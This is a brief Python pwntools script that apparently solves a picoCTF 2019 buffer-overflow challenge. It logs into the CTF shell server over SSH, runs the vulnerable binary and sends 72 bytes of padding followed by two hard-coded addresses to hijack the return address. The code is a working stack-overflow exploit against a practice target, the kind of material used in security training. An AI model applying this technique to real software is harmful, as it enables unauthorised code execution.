#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123'

print("running vuln")
vuln = conn.process(location + '/vuln', cwd = location)
print(vuln.recvline())

print("sending payload")
vuln.sendline(('A'*72).encode() + p64(0x00000000004005de) + p64(0x0000000000400767) + '\n'.encode())

print("done")
vuln.interactive()

